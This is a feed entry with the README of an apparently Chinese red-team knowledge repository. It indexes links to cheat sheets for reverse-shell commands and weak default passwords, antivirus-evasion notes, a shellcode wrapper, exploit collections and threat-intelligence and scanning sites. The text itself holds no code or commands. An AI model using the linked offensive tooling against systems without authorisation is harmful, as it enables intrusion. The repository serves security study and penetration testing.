    <link href="https://github.com/Threekiii/Awesome-Redteam" rel="alternate"></link>
    <summary type="html">&lt;p&gt;一个红队知识仓库&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Awesome-Redteam&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;【免责声明】本仓库所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，否则后果自行承担。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;轻量化红队知识仓库，不定期更新。markdown文档与Linux alias命令或Windows doskey命令联动，可实现终端快捷查询。&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;近期在复现免杀（涵盖msf、evasion、veil、venom、shellter等）：&lt;/strong&gt;&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80.md&#34;&gt;Click Here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;攻防渗透中的常用命令（涵盖信息收集/漏洞挖掘/内网穿透/msf/cs等知识点）：&lt;/strong&gt;&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;长期维护一个综合漏洞知识库（涵盖Vulhub、Peiqi、Edge、0sec、Wooyun等开源漏洞库）：&lt;/strong&gt;&lt;a href=&#34;https://github.com/Threekiii/Vulnerability-Wiki&#34;&gt;Threekiii/Vulnerability-Wiki&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;长期维护一个漏洞利用工具库（涵盖Vulhub、Peiqi等开源漏洞库）：&lt;/strong&gt;&lt;a href=&#34;https://github.com/Threekiii/Awesome-Exploit&#34;&gt;Threekiii/Awesome-Exploit&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;目录&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#awesome-redteam&#34;&gt;Awesome-Redteam&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%9B%AE%E5%BD%95&#34;&gt;目录&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93&#34;&gt;漏洞知识库&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E9%A1%B9%E7%9B%AE%E5%AF%BC%E8%88%AA&#34;&gt;项目导航&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E9%80%9F%E6%9F%A5%E6%96%87%E6%A1%A3-CheatSheets&#34;&gt;速查文档-CheatSheets&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%A0%81-Scripts&#34;&gt;一些代码-Scripts&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AF%86-Tips&#34;&gt;攻防知识-Tips&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA-Docs&#34;&gt;服务搭建-Docs&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%BC%80%E6%BA%90%E5%AF%BC%E8%88%AA&#34;&gt;开源导航&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%BC%96%E8%A7%A3%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%86&#34;&gt;编解码/加解密&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7&#34;&gt;实用工具&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5&#34;&gt;威胁情报&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2&#34;&gt;网络空间搜索&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93&#34;&gt;公开知识库&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%85%B6%E4%BB%96&#34;&gt;其他&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&#34;&gt;信息收集&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#ip%E5%9F%9F%E5%90%8D&#34;&gt;IP/域名&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%A1%AE%E8%AE%A4%E7%9C%9F%E5%AE%9Eip%E5%9C%B0%E5%9D%80&#34;&gt;确认真实IP地址&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A4%9A%E4%B8%AA%E5%9C%B0%E7%82%B9ping%E6%9C%8D%E5%8A%A1%E5%99%A8&#34;&gt;多个地点Ping服务器&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#whois%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF%E5%8F%8D%E6%9F%A5&#34;&gt;Whois注册信息反查&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#dns%E6%95%B0%E6%8D%AE%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2&#34;&gt;DNS数据聚合查询&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#tls%E8%AF%81%E4%B9%A6%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2&#34;&gt;TLS证书信息查询&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#ip%E5%9C%B0%E5%9D%80%E6%AE%B5%E6%94%B6%E9%9B%86&#34;&gt;IP地址段收集&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB&#34;&gt;指纹识别&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%89%AB%E6%8F%8F%E7%88%86%E7%A0%B4&#34;&gt;扫描/爆破&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%88%86%E7%A0%B4%E5%AD%97%E5%85%B8&#34;&gt;爆破字典&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2&#34;&gt;信息泄露&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%BB%BC%E5%90%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&#34;&gt;综合信息收集&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&#34;&gt;内网信息收集&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6&#34;&gt;漏洞研究&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#src&#34;&gt;SRC&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%BC%80%E6%BA%90%E6%96%87%E5%BA%93&#34;&gt;开源文库&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E9%9D%B6%E6%9C%BA%E5%B9%B3%E5%8F%B0&#34;&gt;靶机平台&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8&#34;&gt;漏洞利用&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#dnslog&#34;&gt;DNSlog&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#bypass&#34;&gt;Bypass&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&#34;&gt;内网渗透&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#payloads&#34;&gt;Payloads&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#webshell&#34;&gt;WebShell&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#bypass-1&#34;&gt;Bypass&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%85%8D%E6%9D%80&#34;&gt;免杀&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F&#34;&gt;内网穿透&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%BC%80%E6%BA%90%E8%9C%9C%E7%BD%90&#34;&gt;开源蜜罐&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8&#34;&gt;容器安全&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%85%B6%E4%BB%96-1&#34;&gt;其他&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%96%B0%E4%B8%80%E4%BB%A3%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF&#34;&gt;新一代信息技术&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%89%A9%E8%81%94%E7%BD%91&#34;&gt;移动端/物联网&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%BA%91%E6%9C%8D%E5%8A%A1&#34;&gt;云服务&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A4%A7%E6%95%B0%E6%8D%AE&#34;&gt;大数据&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90&#34;&gt;逆向分析&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#ctf&#34;&gt;CTF&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#ctf%E5%B9%B3%E5%8F%B0&#34;&gt;CTF平台&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%B7%A5%E5%85%B7%E8%B5%8B%E8%83%BD&#34;&gt;工具赋能&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#metasploit&#34;&gt;Metasploit&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#cobaltstrike&#34;&gt;Cobaltstrike&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#burpsuite&#34;&gt;Burpsuite&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#chrome-crx&#34;&gt;Chrome crx&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#xray&#34;&gt;Xray&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#zsh&#34;&gt;Zsh&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF&#34;&gt;使用姿势&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A6%82%E4%BD%95%E5%9C%A8windows%E4%B8%8A%E4%BD%BF%E7%94%A8alias&#34;&gt;如何在Windows上使用alias&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BF%AB%E9%80%9F%E6%9F%A5%E7%9C%8Bmarkdown%E6%96%87%E6%A1%A3&#34;&gt;如何使用浏览器快速查看markdown文档&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;漏洞知识库&lt;/h2&gt; &#xA;&lt;p&gt;Vulnerability Wiki，一个基于docsify开发的漏洞知识库项目，集成了Vulhub、Peiqi、Edge、0sec、Wooyun等开源漏洞库。&lt;/p&gt; &#xA;&lt;p&gt;可以通过docsify自定义部署，也可以通过docker-compose快速部署。&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Vulnerability Wiki：&lt;a href=&#34;https://github.com/Threekiii/Vulnerability-Wiki&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205131146422.png&#34; alt=&#34;image-20220513114641254&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;项目导航&lt;/h2&gt; &#xA;&lt;h3&gt;速查文档-CheatSheets&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;攻防渗透常用命令速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;反弹shell命令速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;重要端口及服务速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E9%87%8D%E8%A6%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;HTTP状态码速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/HTTP%E7%8A%B6%E6%80%81%E7%A0%81%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;安全厂商及官网链接速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E5%AE%89%E5%85%A8%E5%8E%82%E5%95%86%E5%8F%8A%E5%AE%98%E7%BD%91%E9%93%BE%E6%8E%A5%E9%80%9F%E6%9F%A5.txt&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;主要安全产品及弱口令速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E4%B8%BB%E8%A6%81%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E5%8F%8A%E5%BC%B1%E5%8F%A3%E4%BB%A4%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Apache项目及漏洞指纹速查：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/Apache%E9%A1%B9%E7%9B%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%8C%87%E7%BA%B9%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;OWASP TOP10 2017/2021：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/OWASP%20TOP10.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;一些代码-Scripts&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ShellcodeWrapper：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/ShellcodeWrapper&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;AntivirusScanner：杀软进程检测脚本 &lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;攻防知识-Tips&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;内网渗透-免杀：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;红队中易被攻击的一些重点系统漏洞整理（来源：棱角安全团队）：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E7%BA%A2%E9%98%9F%E4%B8%AD%E6%98%93%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E4%BA%9B%E9%87%8D%E7%82%B9%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;网络攻击与防御图谱：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%9B%BE%E8%B0%B1.svg&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;服务搭建-Docs&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DNS log平台搭建：&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/docs/DNS%20log%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA.md&#34;&gt;Click Here&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;开源导航&lt;/h2&gt; &#xA;&lt;h3&gt;编解码/加解密&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CyberChef：编解码及加密，可本地部署 &lt;a href=&#34;https://github.com/gchq/CyberChef&#34;&gt;https://github.com/gchq/CyberChef&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;OK Tools在线工具：&lt;a href=&#34;https://github.com/wangyiwy/oktools&#34;&gt;https://github.com/wangyiwy/oktools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CTF在线工具：&lt;a href=&#34;http://www.hiencode.com/&#34;&gt;http://www.hiencode.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Unicode字符表：&lt;a href=&#34;https://www.52unicode.com/enclosed-alphanumerics-zifu&#34;&gt;https://www.52unicode.com/enclosed-alphanumerics-zifu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在线MD5 Hash破解：&lt;a href=&#34;https://www.somd5.com/&#34;&gt;https://www.somd5.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;XSSEE：在线综合编解码工具 &lt;a href=&#34;https://evilcos.me/lab/xssee/&#34;&gt;https://evilcos.me/lab/xssee/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;实用工具&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Explain Shell：Shell命令解析 &lt;a href=&#34;https://explainshell.com/&#34;&gt;https://explainshell.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在线正则表达式：&lt;a href=&#34;https://c.runoob.com/front-end/854/&#34;&gt;https://c.runoob.com/front-end/854/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Webshell Chop：&lt;a href=&#34;https://webshellchop.chaitin.cn/demo/&#34;&gt;https://webshellchop.chaitin.cn/demo/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;XSS Chop：&lt;a href=&#34;https://xsschop.chaitin.cn/demo/&#34;&gt;https://xsschop.chaitin.cn/demo/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;WebShell查杀：&lt;a href=&#34;https://n.shellpub.com/&#34;&gt;https://n.shellpub.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;HTML5 Security Cheatsheet：XSS攻击向量学习/参考 &lt;a href=&#34;https://html5sec.org/&#34;&gt;https://html5sec.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在线代码格式标准化：&lt;a href=&#34;http://web.chacuo.net/formatsh&#34;&gt;http://web.chacuo.net/formatsh&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;威胁情报&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Virustotal：&lt;a href=&#34;https://www.virustotal.com/gui/home/upload&#34;&gt;https://www.virustotal.com/gui/home/upload&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;腾讯哈勃分析系统：&lt;a href=&#34;https://habo.qq.com/tool/index&#34;&gt;https://habo.qq.com/tool/index&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;微步在线威胁情报：&lt;a href=&#34;https://x.threatbook.cn/&#34;&gt;https://x.threatbook.cn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;奇安信威胁情报：&lt;a href=&#34;https://ti.qianxin.com/&#34;&gt;https://ti.qianxin.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;360威胁情报：&lt;a href=&#34;https://ti.360.net/#/homepage&#34;&gt;https://ti.360.net/#/homepage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;安恒威胁情报：&lt;a href=&#34;https://ti.dbappsecurity.com.cn/&#34;&gt;https://ti.dbappsecurity.com.cn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;火线安全平台：&lt;a href=&#34;https://www.huoxian.cn&#34;&gt;https://www.huoxian.cn&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;知道创宇漏洞平台：&lt;a href=&#34;https://www.seebug.org/&#34;&gt;https://www.seebug.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hacking8安全信息流：&lt;a href=&#34;https://i.hacking8.com/&#34;&gt;https://i.hacking8.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;网络空间搜索&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fofa：&lt;a href=&#34;https://fofa.info/&#34;&gt;https://fofa.info/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Shodan：&lt;a href=&#34;https://www.shodan.io/&#34;&gt;https://www.shodan.io/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ZoomEye：&lt;a href=&#34;https://www.zoomeye.org/&#34;&gt;https://www.zoomeye.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;谛听：&lt;a href=&#34;https://www.ditecting.com/&#34;&gt;https://www.ditecting.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;360网络空间测绘：&lt;a href=&#34;https://quake.360.cn/quake/#/index&#34;&gt;https://quake.360.cn/quake/#/index&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Google Hacking Database：&lt;a href=&#34;https://www.exploit-db.com/google-hacking-database&#34;&gt;https://www.exploit-db.com/google-hacking-database&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; 